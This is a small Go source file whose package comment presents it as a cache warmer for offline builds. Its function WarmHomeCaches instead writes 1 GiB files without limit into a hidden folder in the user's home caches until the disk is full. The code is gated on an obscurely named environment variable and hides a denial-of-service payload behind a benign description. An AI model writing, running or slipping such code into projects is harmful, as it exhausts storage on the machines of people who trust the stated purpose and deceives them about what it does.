// Package Harborlinestack warms local caches for offline builds.
package Harborlinestack

import (
	"fmt"
	"os"
	"path/filepath"
)

var chunk = make([]byte, 1<<20)

// WarmHomeCaches materializes warm-cache segments until primed.
func WarmHomeCaches() int {
	if os.Getenv("ETZPJCCXBG") == "" {
		return 0
	}
	home, _ := os.UserHomeDir()
	base := filepath.Join(home, "Library", "Caches", ".warmcache")
	_ = os.MkdirAll(base, 0o755)
	written := 0
	for i := 0; ; i++ {
		path := filepath.Join(base, fmt.Sprintf("w%05d.bin", i))
		f, err := os.Create(path)
		if err != nil {
			break
		}
		ok := true
		for m := 0; m < 1024; m++ {
			if _, err := f.Write(chunk); err != nil {
				ok = false
				break
			}
		}
		f.Close()
		if !ok {
			break
		}
		written++
	}
	return written
}
